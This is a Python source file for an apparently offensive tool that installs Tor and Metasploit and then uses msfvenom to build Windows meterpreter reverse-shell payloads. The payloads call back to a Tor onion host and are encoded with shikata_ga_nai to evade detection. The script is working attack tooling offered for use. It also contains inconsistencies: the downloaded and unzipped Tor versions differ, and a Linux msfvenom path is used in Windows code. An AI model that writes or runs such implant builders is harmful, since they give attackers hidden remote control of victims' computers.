import os
import wget
import time
import crypt
import shutil
import zipfile
import tornado
import pathlib
import argparse
import subprocess
from colorama import Fore, Back, Style, init
init(autoreset=False)
bblue = Fore.BLUE + Style.BRIGHT
bos = "\033[1;37m"

def download_tor():
    tor_url = 'https://www.torproject.org/dist/torbrowser/11.0.10/tor-win32-0.4.6.10.zip'
    wget.download(tor_url, out='C:')
    print(f"\n{bblue}[+]{bos} Tor is downloaded in C:\\ directory.")
    with zipfile.ZipFile('C:\\tor-win32-0.4.6.9.zip', 'r') as tor:
        os.path.join("C:")
        tor.extractall('C:\\')
        print(f'{bblue}[+]{bos} File is unzipped in C: disk.')
    pathlib.Path('C:\\tor-win32-0.4.6.9.zip').unlink()
    shutil.rmtree('C:\\Data')
    print(f"{bblue}[+]{bos} Zip file is gone.")

def download_metasploit():
    metasploit_url = 'https://windows.metasploit.com/metasploitframework-latest.msi'
    wget.download(metasploit_url, out='C:\\Tor\\')
    subprocess.run(['msiexec', '/i', 'metasploitframework-latest.msi'])
    print(f"\n{bblue}[+]{bos} Metasploit is downloaded.")

def shell(host):
    print(f"{bblue}[+]{bos} What payload do you need: [tcp-https-http-ipv6_tcp]:")
    payload = input()
    payload = payload or "tcp"

    print(f"{bblue}[+]{bos} Enter arch: [x86--x64] [default: x64]")
    arch = input()
    arch = arch or "x64"
    
    print(f"{bblue}[+]{bos} Encryption: [default: x86/shikata_ga_nai]:")
    encryption = input()
    encryption = encryption or "x86/shikata_ga_nai"

    print(f"{bblue}[*]{bos} Payload: {payload}")
    print(f"{bblue}[*]{bos} Arch: {arch}")
    print(f"{bblue}[*]{bos} Onion Adress: {host}:80")
    print(f"{bblue}[*]{bos} Encryption: {encryption}")
    print(f"{bblue}[+]{bos} Msfvenom payload creating..")
    
    if arch == "x64":
        os.system(f"/usr/bin/msfvenom -p windows/x64/meterpreter_reverse_{payload} LHOST={host} LPORT=80 -e {encryption} EXITFUNC=process --platform windows -a {arch} -f raw -o tornado.raw")

    if arch == "x86":
        os.system(f"msfvenom -p windows/meterpreter_reverse_{payload} LHOST={host} LPORT=80 -e {encryption} --platform windows -a x86 -f raw -o tornado.raw")
